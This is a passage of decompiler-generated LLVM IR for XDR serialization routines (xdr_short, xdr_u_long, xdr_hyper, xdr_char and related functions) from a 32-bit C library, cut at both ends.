dec_label_pc_8056a9c:                             ; preds = %entry
  %v9_8056a9c = icmp eq i32 %v2_8056a8e, 1
  %v1_8056a9f = icmp eq i1 %v9_8056a9c, false
  br i1 %v1_8056a9f, label %dec_label_pc_8056ab0, label %dec_label_pc_8056aa1

dec_label_pc_8056aa1:                             ; preds = %dec_label_pc_8056a9c
  %v1_8056aa1 = add i32 %tmp2, 4
  %v2_8056aa1 = inttoptr i32 %v1_8056aa1 to i32*
  %v3_8056aa1 = load i32, i32* %v2_8056aa1, align 4
  store i32 %v3_8056aa1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056aae

dec_label_pc_8056aae:                             ; preds = %dec_label_pc_8056a94, %dec_label_pc_8056aa1
  %storemerge.in.in = phi i32 [ %v1_8056a97, %dec_label_pc_8056a94 ], [ %v3_8056aa1, %dec_label_pc_8056aa1 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8056ab0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ab0

dec_label_pc_8056ab0:                             ; preds = %dec_label_pc_8056a9c, %dec_label_pc_8056aae
  %v0_8056ab0 = phi i32 [ %v2_8056a8e, %dec_label_pc_8056a9c ], [ %v0_8056ab0.pre, %dec_label_pc_8056aae ]
  %v9_8056ab0 = icmp eq i32 %v0_8056ab0, 2
  %v1_8056ab3 = zext i1 %v9_8056ab0 to i32
  store i32 %v1_8056ab3, i32* %eax.global-to-local, align 4
  ret i32 %v1_8056ab3

; uselistorder directives
  uselistorder i32 %v2_8056a8e, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8056ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8056aae, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056ac6 = load i32, i32* %arg1, align 4
  %v9_8056ac8 = icmp eq i32 %v2_8056ac6, 1
  br i1 %v9_8056ac8, label %dec_label_pc_8056af5, label %dec_label_pc_8056acd

dec_label_pc_8056acd:                             ; preds = %entry
  %v5_8056ac8 = icmp eq i32 %v2_8056ac6, 0
  br i1 %v5_8056ac8, label %dec_label_pc_8056adb, label %dec_label_pc_8056acf

dec_label_pc_8056acf:                             ; preds = %dec_label_pc_8056acd
  %v9_8056ad4 = icmp eq i32 %v2_8056ac6, 2
  br i1 %v9_8056ad4, label %dec_label_pc_8056b19, label %dec_label_pc_8056b17

dec_label_pc_8056adb:                             ; preds = %dec_label_pc_8056acd
  %v1_8056adb = inttoptr i32 %arg2 to i16*
  %v2_8056adb = load i16, i16* %v1_8056adb, align 2
  %v3_8056adb = sext i16 %v2_8056adb to i32
  store i32 %v3_8056adb, i32* %stack_var_-8, align 4
  %v1_8056ae4 = add i32 %tmp8, 4
  %v2_8056ae4 = inttoptr i32 %v1_8056ae4 to i32*
  %v3_8056ae4 = load i32, i32* %v2_8056ae4, align 4
  %v2_8056ae7 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8056aed = add i32 %v3_8056ae4, 4
  %v6_8056aed = inttoptr i32 %v5_8056aed to i32*
  %v7_8056aed = load i32, i32* %v6_8056aed, align 4
  call void @__pseudo_call(i32 %v7_8056aed)
  br label %dec_label_pc_8056b19

dec_label_pc_8056af5:                             ; preds = %entry
  %v1_8056af7 = add i32 %tmp8, 4
  %v2_8056af7 = inttoptr i32 %v1_8056af7 to i32*
  %v3_8056af7 = load i32, i32* %v2_8056af7, align 4
  %v5_8056b00 = inttoptr i32 %v3_8056af7 to i32*
  %v6_8056b00 = load i32, i32* %v5_8056b00, align 4
  call void @__pseudo_call(i32 %v6_8056b00)
  %v1_8056b05 = icmp eq i32 %v3_8056af7, 0
  br i1 %v1_8056b05, label %dec_label_pc_8056b17, label %dec_label_pc_8056b09

dec_label_pc_8056b09:                             ; preds = %dec_label_pc_8056af5
  %v2_8056b0d = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056b0d = inttoptr i32 %v2_8056b0d to i16*
  br label %dec_label_pc_8056b19

dec_label_pc_8056b17:                             ; preds = %dec_label_pc_8056acf, %dec_label_pc_8056af5
  br label %dec_label_pc_8056b19

dec_label_pc_8056b19:                             ; preds = %dec_label_pc_8056acf, %dec_label_pc_8056b09, %dec_label_pc_8056adb, %dec_label_pc_8056b17
  %v0_8056b1d = phi i32 [ 1, %dec_label_pc_8056acf ], [ 1, %dec_label_pc_8056b09 ], [ %v2_8056ae7, %dec_label_pc_8056adb ], [ 0, %dec_label_pc_8056b17 ]
  %v2_8056b1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056b1c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056b1d

; uselistorder directives
  uselistorder i32 %v2_8056ac6, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056b19, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056b17, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8056b1e = call i32 @__GI_xdr_long()
  ret i32 %v0_8056b1e
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056b2f = load i32, i32* %arg1, align 4
  %v9_8056b31 = icmp eq i32 %v2_8056b2f, 1
  br i1 %v9_8056b31, label %dec_label_pc_8056b44, label %dec_label_pc_8056b36

dec_label_pc_8056b36:                             ; preds = %entry
  %v5_8056b31 = icmp eq i32 %v2_8056b2f, 0
  br i1 %v5_8056b31, label %dec_label_pc_8056b65, label %dec_label_pc_8056b38

dec_label_pc_8056b38:                             ; preds = %dec_label_pc_8056b36
  %v9_8056b3d = icmp eq i32 %v2_8056b2f, 2
  br i1 %v9_8056b3d, label %dec_label_pc_8056b76, label %dec_label_pc_8056b74

dec_label_pc_8056b44:                             ; preds = %entry
  %v1_8056b46 = add i32 %tmp6, 4
  %v2_8056b46 = inttoptr i32 %v1_8056b46 to i32*
  %v3_8056b46 = load i32, i32* %v2_8056b46, align 4
  %v5_8056b4f = inttoptr i32 %v3_8056b46 to i32*
  %v6_8056b4f = load i32, i32* %v5_8056b4f, align 4
  call void @__pseudo_call(i32 %v6_8056b4f)
  %v1_8056b54 = icmp eq i32 %v3_8056b46, 0
  br i1 %v1_8056b54, label %dec_label_pc_8056b74, label %dec_label_pc_8056b58

dec_label_pc_8056b58:                             ; preds = %dec_label_pc_8056b44
  %v1_8056b5c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056b5c = inttoptr i32 %v1_8056b5c to i32*
  br label %dec_label_pc_8056b76

dec_label_pc_8056b65:                             ; preds = %dec_label_pc_8056b36
  %v1_8056b67 = add i32 %tmp6, 4
  %v2_8056b67 = inttoptr i32 %v1_8056b67 to i32*
  %v3_8056b67 = load i32, i32* %v2_8056b67, align 4
  %v5_8056b6c = add i32 %v3_8056b67, 4
  %v6_8056b6c = inttoptr i32 %v5_8056b6c to i32*
  %v7_8056b6c = load i32, i32* %v6_8056b6c, align 4
  call void @__pseudo_call(i32 %v7_8056b6c)
  br label %dec_label_pc_8056b76

dec_label_pc_8056b74:                             ; preds = %dec_label_pc_8056b38, %dec_label_pc_8056b44
  br label %dec_label_pc_8056b76

dec_label_pc_8056b76:                             ; preds = %dec_label_pc_8056b38, %dec_label_pc_8056b65, %dec_label_pc_8056b58, %dec_label_pc_8056b74
  %v0_8056b7a = phi i32 [ 1, %dec_label_pc_8056b38 ], [ %v3_8056b67, %dec_label_pc_8056b65 ], [ 1, %dec_label_pc_8056b58 ], [ 0, %dec_label_pc_8056b74 ]
  %v2_8056b79 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056b79, i32* @ebx, align 4
  ret i32 %v0_8056b7a

; uselistorder directives
  uselistorder i32 %v2_8056b2f, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056b76, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056b74, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v3_8056b7b = ptrtoint i32* %ulp to i32
  %v5_8056b7b = call i32 @xdr_u_long(i32* %xdrs, i32 %v3_8056b7b)
  ret i32 %v5_8056b7b
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8056b8d = inttoptr i32 %tmp7 to i32*
  %v2_8056b8d = load i32, i32* %v1_8056b8d, align 4
  store i32 %v2_8056b8d, i32* %eax.global-to-local, align 4
  %v1_8056b8f = icmp eq i32 %v2_8056b8d, 0
  %v1_8056b91 = icmp eq i1 %v1_8056b8f, false
  br i1 %v1_8056b91, label %dec_label_pc_8056bd8, label %dec_label_pc_8056bc0

dec_label_pc_8056bc0:                             ; preds = %entry
  %v1_8056b93 = add i32 %tmp6, 4
  %v2_8056b93 = inttoptr i32 %v1_8056b93 to i32*
  %v3_8056b93 = load i32, i32* %v2_8056b93, align 4
  store i32 %v3_8056b93, i32* %eax.global-to-local, align 4
  store i32 %v3_8056b93, i32* %stack_var_-12, align 4
  %v2_8056ba0 = ashr i32 %v3_8056b93, 31
  store i32 %v2_8056ba0, i32* %edx.global-to-local, align 4
  %v1_8056ba3 = inttoptr i32 %tmp6 to i32*
  %v2_8056ba3 = load i32, i32* %v1_8056ba3, align 4
  store i32 %v2_8056ba3, i32* %eax.global-to-local, align 4
  %v1_8056bab = add i32 %tmp7, 4
  %v2_8056bab = inttoptr i32 %v1_8056bab to i32*
  %v3_8056bab = load i32, i32* %v2_8056bab, align 4
  store i32 %v3_8056bab, i32* %edx.global-to-local, align 4
  %v2_8056bae = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056bae, i32* %eax.global-to-local, align 4
  %v5_8056bb4 = add i32 %v3_8056bab, 4
  %v6_8056bb4 = inttoptr i32 %v5_8056bb4 to i32*
  %v7_8056bb4 = load i32, i32* %v6_8056bb4, align 4
  call void @__pseudo_call(i32 %v7_8056bb4)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8056bc0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056bc0, i32* %eax.global-to-local, align 4
  %v0_8056bc6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056bc6 = add i32 %v0_8056bc6, 4
  %v2_8056bc6 = inttoptr i32 %v1_8056bc6 to i32*
  %v3_8056bc6 = load i32, i32* %v2_8056bc6, align 4
  store i32 %v3_8056bc6, i32* %edx.global-to-local, align 4
  %v5_8056bcb = add i32 %v3_8056bc6, 4
  %v6_8056bcb = inttoptr i32 %v5_8056bcb to i32*
  %v7_8056bcb = load i32, i32* %v6_8056bcb, align 4
  call void @__pseudo_call(i32 %v7_8056bcb)
  %v4_8056bd3 = and i32 %v2_8056bc0, -256
  %v5_8056bd3 = or i32 %v4_8056bd3, 1
  br label %dec_label_pc_8056c2d

dec_label_pc_8056bd8:                             ; preds = %entry
  %v9_8056bd8 = icmp eq i32 %v2_8056b8d, 1
  %v1_8056bdb = icmp eq i1 %v9_8056bd8, false
  br i1 %v1_8056bdb, label %dec_label_pc_8056c27, label %dec_label_pc_8056bdd

dec_label_pc_8056bdd:                             ; preds = %dec_label_pc_8056bd8
  %v1_8056bdf = add i32 %tmp7, 4
  %v2_8056bdf = inttoptr i32 %v1_8056bdf to i32*
  %v3_8056bdf = load i32, i32* %v2_8056bdf, align 4
  store i32 %v3_8056bdf, i32* %eax.global-to-local, align 4
  %v2_8056be2 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056be2, i32* %edx.global-to-local, align 4
  %v5_8056be8 = inttoptr i32 %v3_8056bdf to i32*
  %v6_8056be8 = load i32, i32* %v5_8056be8, align 4
  call void @__pseudo_call(i32 %v6_8056be8)
  %v1_8056bed = icmp eq i32 %v3_8056bdf, 0
  br i1 %v1_8056bed, label %dec_label_pc_8056c32, label %dec_label_pc_8056c05

dec_label_pc_8056c05:                             ; preds = %dec_label_pc_8056bdd
  %v2_8056bf1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056bf1, i32* %eax.global-to-local, align 4
  %v0_8056bf7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056bf7 = add i32 %v0_8056bf7, 4
  %v2_8056bf7 = inttoptr i32 %v1_8056bf7 to i32*
  %v3_8056bf7 = load i32, i32* %v2_8056bf7, align 4
  store i32 %v3_8056bf7, i32* %edx.global-to-local, align 4
  %v5_8056bfc = inttoptr i32 %v3_8056bf7 to i32*
  %v6_8056bfc = load i32, i32* %v5_8056bfc, align 4
  call void @__pseudo_call(i32 %v6_8056bfc)
  %v3_8056c05 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8056c11 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056c11 = add i32 %v1_8056c11, 4
  %v3_8056c11 = inttoptr i32 %v2_8056c11 to i32*
  store i32 %v3_8056c05, i32* %v3_8056c11, align 4
  %v0_8056c14 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056c14 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056c14 = inttoptr i32 %v1_8056c14 to i32*
  store i32 %v0_8056c14, i32* %v2_8056c14, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8056c1f = load i32, i32* %esi.global-to-local, align 4
  %v1_8056c1f = inttoptr i32 %v0_8056c1f to i32*
  %v2_8056c1f = load i32, i32* %v1_8056c1f, align 4
  %v4_8056c1f = or i32 %v2_8056c1f, %tmp
  store i32 %v4_8056c1f, i32* %v1_8056c1f, align 4
  %v0_8056c37.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c34

dec_label_pc_8056c27:                             ; preds = %dec_label_pc_8056bd8
  %v9_8056c27 = icmp eq i32 %v2_8056b8d, 2
  %v1_8056c2a = zext i1 %v9_8056c27 to i32
  %v3_8056c2a = and i32 %v2_8056b8d, -256
  %v4_8056c2a = or i32 %v1_8056c2a, %v3_8056c2a
  br label %dec_label_pc_8056c2d

dec_label_pc_8056c2d:                             ; preds = %dec_label_pc_8056bc0, %dec_label_pc_8056c27
  %storemerge = phi i32 [ %v5_8056bd3, %dec_label_pc_8056bc0 ], [ %v4_8056c2a, %dec_label_pc_8056c27 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056c2d = urem i32 %storemerge, 256
  store i32 %v1_8056c2d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c34

dec_label_pc_8056c32:                             ; preds = %dec_label_pc_8056bdd
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c34

dec_label_pc_8056c34:                             ; preds = %dec_label_pc_8056c2d, %dec_label_pc_8056c05, %dec_label_pc_8056c32
  %v0_8056c37 = phi i32 [ %v1_8056c2d, %dec_label_pc_8056c2d ], [ %v0_8056c37.pre, %dec_label_pc_8056c05 ], [ 0, %dec_label_pc_8056c32 ]
  store i32 %v0_8056c37, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056c37

; uselistorder directives
  uselistorder i32 %v0_8056c37, { 1, 0 }
  uselistorder i32 %v1_8056c2d, { 1, 0 }
  uselistorder i32 %v2_8056b8d, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_8056c34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056c2d, { 1, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8056c49 = inttoptr i32 %tmp7 to i32*
  %v2_8056c49 = load i32, i32* %v1_8056c49, align 4
  store i32 %v2_8056c49, i32* %eax.global-to-local, align 4
  %v1_8056c4b = icmp eq i32 %v2_8056c49, 0
  %v1_8056c4d = icmp eq i1 %v1_8056c4b, false
  br i1 %v1_8056c4d, label %dec_label_pc_8056c8b, label %dec_label_pc_8056c73

dec_label_pc_8056c73:                             ; preds = %entry
  %v1_8056c4f = add i32 %tmp6, 4
  %v2_8056c4f = inttoptr i32 %v1_8056c4f to i32*
  %v3_8056c4f = load i32, i32* %v2_8056c4f, align 4
  store i32 %v3_8056c4f, i32* %stack_var_-12, align 4
  %v2_8056c5c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056c5c, i32* %eax.global-to-local, align 4
  %v1_8056c62 = add i32 %tmp7, 4
  %v2_8056c62 = inttoptr i32 %v1_8056c62 to i32*
  %v3_8056c62 = load i32, i32* %v2_8056c62, align 4
  store i32 %v3_8056c62, i32* %edx.global-to-local, align 4
  %v5_8056c67 = add i32 %v3_8056c62, 4
  %v6_8056c67 = inttoptr i32 %v5_8056c67 to i32*
  %v7_8056c67 = load i32, i32* %v6_8056c67, align 4
  call void @__pseudo_call(i32 %v7_8056c67)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8056c73 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056c73, i32* %eax.global-to-local, align 4
  %v0_8056c79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c79 = add i32 %v0_8056c79, 4
  %v2_8056c79 = inttoptr i32 %v1_8056c79 to i32*
  %v3_8056c79 = load i32, i32* %v2_8056c79, align 4
  store i32 %v3_8056c79, i32* %edx.global-to-local, align 4
  %v5_8056c7e = add i32 %v3_8056c79, 4
  %v6_8056c7e = inttoptr i32 %v5_8056c7e to i32*
  %v7_8056c7e = load i32, i32* %v6_8056c7e, align 4
  call void @__pseudo_call(i32 %v7_8056c7e)
  %v4_8056c86 = and i32 %v2_8056c73, -256
  %v5_8056c86 = or i32 %v4_8056c86, 1
  br label %dec_label_pc_8056ce1

dec_label_pc_8056c8b:                             ; preds = %entry
  %v9_8056c8b = icmp eq i32 %v2_8056c49, 1
  %v1_8056c8e = icmp eq i1 %v9_8056c8b, false
  br i1 %v1_8056c8e, label %dec_label_pc_8056cdb, label %dec_label_pc_8056cb8

dec_label_pc_8056cb8:                             ; preds = %dec_label_pc_8056c8b
  %v2_8056c90 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056c90, i32* %eax.global-to-local, align 4
  %v1_8056c96 = add i32 %tmp7, 4
  %v2_8056c96 = inttoptr i32 %v1_8056c96 to i32*
  %v3_8056c96 = load i32, i32* %v2_8056c96, align 4
  store i32 %v3_8056c96, i32* %edx.global-to-local, align 4
  %v5_8056c9b = inttoptr i32 %v3_8056c96 to i32*
  %v6_8056c9b = load i32, i32* %v5_8056c9b, align 4
  call void @__pseudo_call(i32 %v6_8056c9b)
  %v2_8056ca4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056ca4, i32* %eax.global-to-local, align 4
  %v0_8056caa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056caa = add i32 %v0_8056caa, 4
  %v2_8056caa = inttoptr i32 %v1_8056caa to i32*
  %v3_8056caa = load i32, i32* %v2_8056caa, align 4
  store i32 %v3_8056caa, i32* %edx.global-to-local, align 4
  %v5_8056caf = inttoptr i32 %v3_8056caa to i32*
  %v6_8056caf = load i32, i32* %v5_8056caf, align 4
  call void @__pseudo_call(i32 %v6_8056caf)
  %v3_8056cb8 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8056cc5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056cc5 = add i32 %v1_8056cc5, 4
  %v3_8056cc5 = inttoptr i32 %v2_8056cc5 to i32*
  store i32 %v3_8056cb8, i32* %v3_8056cc5, align 4
  %v0_8056cc8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056cc8 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056cc8 = inttoptr i32 %v1_8056cc8 to i32*
  store i32 %v0_8056cc8, i32* %v2_8056cc8, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8056cd3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056cd3 = inttoptr i32 %v0_8056cd3 to i32*
  %v2_8056cd3 = load i32, i32* %v1_8056cd3, align 4
  %v4_8056cd3 = or i32 %v2_8056cd3, %tmp
  store i32 %v4_8056cd3, i32* %v1_8056cd3, align 4
  %v0_8056ceb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056ce8

dec_label_pc_8056cdb:                             ; preds = %dec_label_pc_8056c8b
  %v9_8056cdb = icmp eq i32 %v2_8056c49, 2
  %v1_8056cde = zext i1 %v9_8056cdb to i32
  %v3_8056cde = and i32 %v2_8056c49, -256
  %v4_8056cde = or i32 %v1_8056cde, %v3_8056cde
  br label %dec_label_pc_8056ce1

dec_label_pc_8056ce1:                             ; preds = %dec_label_pc_8056c73, %dec_label_pc_8056cdb
  %storemerge = phi i32 [ %v5_8056c86, %dec_label_pc_8056c73 ], [ %v4_8056cde, %dec_label_pc_8056cdb ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056ce1 = urem i32 %storemerge, 256
  store i32 %v1_8056ce1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056ce8

dec_label_pc_8056ce8:                             ; preds = %dec_label_pc_8056ce1, %dec_label_pc_8056cb8
  %v0_8056ceb = phi i32 [ %v1_8056ce1, %dec_label_pc_8056ce1 ], [ %v0_8056ceb.pre, %dec_label_pc_8056cb8 ]
  store i32 %v0_8056ceb, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056ceb

; uselistorder directives
  uselistorder i32 %v0_8056ceb, { 1, 0 }
  uselistorder i32 %v1_8056ce1, { 1, 0 }
  uselistorder i32 %v2_8056c49, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8056ce1, { 1, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_8056cf0 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_8056cf0
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_8056cf5 = call i32 @xdr_u_hyper()
  ret i32 %v0_8056cf5
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056d06 = load i32, i32* %arg1, align 4
  %v9_8056d08 = icmp eq i32 %v2_8056d06, 1
  br i1 %v9_8056d08, label %dec_label_pc_8056d35, label %dec_label_pc_8056d0d

dec_label_pc_8056d0d:                             ; preds = %entry
  %v5_8056d08 = icmp eq i32 %v2_8056d06, 0
  br i1 %v5_8056d08, label %dec_label_pc_8056d1b, label %dec_label_pc_8056d0f

dec_label_pc_8056d0f:                             ; preds = %dec_label_pc_8056d0d
  store i32 1, i32* %eax.global-to-local, align 4
  %v9_8056d14 = icmp eq i32 %v2_8056d06, 2
  br i1 %v9_8056d14, label %dec_label_pc_8056d59, label %dec_label_pc_8056d57

dec_label_pc_8056d1b:                             ; preds = %dec_label_pc_8056d0d
  %v1_8056d1b = inttoptr i32 %arg2 to i16*
  %v2_8056d1b = load i16, i16* %v1_8056d1b, align 2
  %v3_8056d1b = zext i16 %v2_8056d1b to i32
  store i32 %v3_8056d1b, i32* %stack_var_-8, align 4
  %v2_8056d22 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8056d22, i32* %eax.global-to-local, align 4
  %v1_8056d28 = add i32 %tmp10, 4
  %v2_8056d28 = inttoptr i32 %v1_8056d28 to i32*
  %v3_8056d28 = load i32, i32* %v2_8056d28, align 4
  %v5_8056d2d = add i32 %v3_8056d28, 4
  %v6_8056d2d = inttoptr i32 %v5_8056d2d to i32*
  %v7_8056d2d = load i32, i32* %v6_8056d2d, align 4
  call void @__pseudo_call(i32 %v7_8056d2d)
  %v0_8056d5d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d59

dec_label_pc_8056d35:                             ; preds = %entry
  %v2_8056d35 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8056d35, i32* %eax.global-to-local, align 4
  %v1_8056d3b = add i32 %tmp10, 4
  %v2_8056d3b = inttoptr i32 %v1_8056d3b to i32*
  %v3_8056d3b = load i32, i32* %v2_8056d3b, align 4
  %v5_8056d40 = inttoptr i32 %v3_8056d3b to i32*
  %v6_8056d40 = load i32, i32* %v5_8056d40, align 4
  call void @__pseudo_call(i32 %v6_8056d40)
  %v0_8056d45 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056d45 = icmp eq i32 %v0_8056d45, 0
  br i1 %v1_8056d45, label %dec_label_pc_8056d57, label %dec_label_pc_8056d49

dec_label_pc_8056d49:                             ; preds = %dec_label_pc_8056d35
  %v2_8056d4d = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056d4d = inttoptr i32 %v2_8056d4d to i16*
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d59

dec_label_pc_8056d57:                             ; preds = %dec_label_pc_8056d0f, %dec_label_pc_8056d35
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d59

dec_label_pc_8056d59:                             ; preds = %dec_label_pc_8056d0f, %dec_label_pc_8056d49, %dec_label_pc_8056d1b, %dec_label_pc_8056d57
  %v0_8056d5d = phi i32 [ 1, %dec_label_pc_8056d0f ], [ 1, %dec_label_pc_8056d49 ], [ %v0_8056d5d.pre, %dec_label_pc_8056d1b ], [ 0, %dec_label_pc_8056d57 ]
  %v2_8056d5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056d5c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056d5d

; uselistorder directives
  uselistorder i32 %v2_8056d06, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8056d59, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056d57, { 1, 0 }
}

define i32 @xdr_char(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8056d5e = load i32, i32* @ebx, align 4
  store i32 %v0_8056d5e, i32* %stack_var_-4, align 4
  %v4_8056d62 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8056d62, i32* %ebx.global-to-local, align 4
  %v2_8056d66 = load i8, i8* %arg2, align 1
  store i8 %v2_8056d66, i8* %stack_var_-8, align 1
  %v2_8056d6d = ptrtoint i8* %stack_var_-8 to i32
  %v2_8056d76 = call i32 @__GI_xdr_int(i32 %arg1, i32 %v2_8056d6d)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056d80 = icmp eq i32 %v2_8056d76, 0
  br i1 %v1_8056d80, label %dec_label_pc_8056d8c, label %dec_label_pc_8056d84

dec_label_pc_8056d84:                             ; preds = %entry
  %v3_8056d84 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8056d8a = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056d8a = inttoptr i32 %v2_8056d8a to i8*
  store i8 %v3_8056d84, i8* %v3_8056d8a, align 1
  %v0_8056d8c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056d8c

dec_label_pc_8056d8c:                             ; preds = %entry, %dec_label_pc_8056d84
  %v0_8056d8c = phi i32 [ 0, %entry ], [ %v0_8056d8c.pre, %dec_label_pc_8056d84 ]
